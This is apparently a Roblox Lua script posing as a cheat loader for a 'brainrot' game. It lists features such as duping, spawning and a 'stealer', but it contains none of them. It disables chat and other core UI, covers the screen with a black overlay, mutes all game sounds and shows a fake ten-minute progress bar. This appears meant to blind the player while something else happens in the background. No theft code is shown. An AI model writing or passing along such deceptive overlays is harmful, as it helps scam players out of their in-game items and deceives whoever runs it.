local player = game.Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local StarterGui = game:GetService("StarterGui")

-- Disable ALL Roblox CoreGui (chat, leaderboard, backpack etc.)
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- Create main ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LoadingScreen"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999 -- always on top
screenGui.Parent = PlayerGui

-- Fullscreen black background
local bg = Instance.new("Frame")
bg.Size = UDim2.fromScale(1, 1)
bg.Position = UDim2.fromScale(0, 0)
bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.Parent = screenGui

-- Top text: "PREPARING SCRIPT PLEASE WAIT..."
local prepLabel = Instance.new("TextLabel")
prepLabel.Size = UDim2.new(0.6, 0, 0.1, 0)
prepLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
prepLabel.AnchorPoint = Vector2.new(0.5, 0.5)
prepLabel.BackgroundTransparency = 1
prepLabel.Text = "PREPARING SCRIPT PLEASE WAIT..."
prepLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
prepLabel.Font = Enum.Font.Arimo
prepLabel.TextScaled = true
prepLabel.TextStrokeTransparency = 0
prepLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
prepLabel.RichText = true
prepLabel.Parent = bg

-- Loading bar container
local barContainer = Instance.new("Frame")
barContainer.AnchorPoint = Vector2.new(0.5, 0.5)
barContainer.Position = UDim2.new(0.5, 0, 0.5, 0)
barContainer.Size = UDim2.new(0.6, 0, 0.06, 0)
barContainer.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
barContainer.BorderSizePixel = 0
barContainer.Parent = bg

-- Loading bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
barFill.BorderSizePixel = 0
barFill.Parent = barContainer

-- Features text below loading bar (smaller)
local featuresLabel = Instance.new("TextLabel")
featuresLabel.Size = UDim2.new(0.6, 0, 0.3, 0)
featuresLabel.Position = UDim2.new(0.5, 0, 0.6, 0)
featuresLabel.AnchorPoint = Vector2.new(0.5, 0)
featuresLabel.BackgroundTransparency = 1
featuresLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
featuresLabel.Font = Enum.Font.Arimo
featuresLabel.TextScaled = false
featuresLabel.TextSize = 18 -- ~75% size
featuresLabel.TextStrokeTransparency = 0
featuresLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
featuresLabel.RichText = true
featuresLabel.Text = [[
SCRIPT FEATURES:
• DUPE 50+ M/S Brainrot
• brainrot spawner
• Desync stealer
• unpatched laser gun
• paintball lagger
• Tp best brainrot
• inf jump
]]
featuresLabel.TextWrapped = true
featuresLabel.TextYAlignment = Enum.TextYAlignment.Top
featuresLabel.Parent = bg

--|| SOUND CONTROL ||--
local function muteAllSounds()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Sound") then
            obj:SetAttribute("OriginalVolume", obj.Volume)
            obj.Volume = 0
        end
    end
end

local function unmuteAllSounds()
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("Sound") then
            local original = obj:GetAttribute("OriginalVolume")
            if original then
                obj.Volume = original
            end
        end
    end
end

-- Mute new sounds if created while loading
workspace.DescendantAdded:Connect(function(desc)
    if desc:IsA("Sound") then
        desc:SetAttribute("OriginalVolume", desc.Volume)
        desc.Volume = 0
    end
end)

muteAllSounds()

--|| LOADING BAR ANIMATION ||--
local TOTAL_TIME = 600 -- 10 minutes
local updateRate = 0.05
local steps = TOTAL_TIME / updateRate

for i = 1, steps do
    local progress = i / steps
    barFill.Size = UDim2.new(progress, 0, 1, 0)
    task.wait(updateRate)
end

--|| CLEANUP ||--
unmuteAllSounds()

-- Fade out effect
for t = 1, 25 do
    local transparency = t / 25
    bg.BackgroundTransparency = transparency
    barContainer.BackgroundTransparency = transparency
    barFill.BackgroundTransparency = transparency
    prepLabel.TextTransparency = transparency
    featuresLabel.TextTransparency = transparency
    task.wait(0.02)
end

-- Destroy GUI and re-enable Core UI
screenGui:Destroy()
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
